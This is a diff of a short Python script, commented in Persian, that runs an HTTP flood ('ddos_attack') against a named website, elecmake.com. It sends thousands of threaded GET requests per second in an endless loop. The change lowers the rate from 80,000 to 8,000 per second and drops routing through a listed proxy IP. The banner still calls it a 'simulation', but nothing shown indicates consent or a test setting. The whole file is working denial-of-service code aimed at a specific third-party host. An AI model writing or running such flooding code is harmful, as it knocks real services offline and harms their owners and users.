@@ -4,24 +4,18 @@ import time
 
 # تنظیمات هدف
 target_url = "https://elecmake.com"  # URL هدف
-max_requests_per_second = 80000  # تعداد درخواست‌ها در ثانیه
+max_requests_per_second = 8000  # تعداد درخواست‌ها در ثانیه
 report_interval = 100  # تعداد درخواست‌ها برای گزارش‌دهی
 
 # شمارش درخواست‌ها
 request_count = 0
 
-# تنظیم پروکسی
-proxies = {
-    "http": "http://46.249.100.228:3128",  # پروکسی HTTP
-    "https": "http://46.249.100.228:3128"  # پروکسی HTTPS
-}
-
 # تابع ارسال درخواست HTTP
 def send_request():
     global request_count
     try:
-        # ارسال درخواست از طریق پروکسی
-        response = requests.get(target_url, proxies=proxies)
+        # ارسال درخواست به آدرس هدف
+        response = requests.get(target_url)
         request_count += 1
         if request_count % report_interval == 0:
             print(f"[INFO] {request_count} requests sent so far.")
@@ -32,7 +26,7 @@ def send_request():
 def ddos_attack():
     while True:
         threads = []
-        for _ in range(max_requests_per_second // 100):  # تقسیم 80,000 درخواست به 100 درخواست در هر ثانیه
+        for _ in range(max_requests_per_second // 100):  # تقسیم 8000 درخواست به 100 درخواست در هر ثانیه
             t = threading.Thread(target=send_request)
             t.start()
             threads.append(t)
@@ -41,6 +35,6 @@ def ddos_attack():
         time.sleep(1)  # 1 ثانیه تأخیر بین هر دسته از درخواست‌ها
 
 if __name__ == "__main__":
-    print("[INFO] Starting DDoS Attack Simulation with Proxy on Port 3128...")
+    print("[INFO] Starting DDoS Attack Simulation...")
     ddos_attack()
     print("[INFO] Attack finished.")
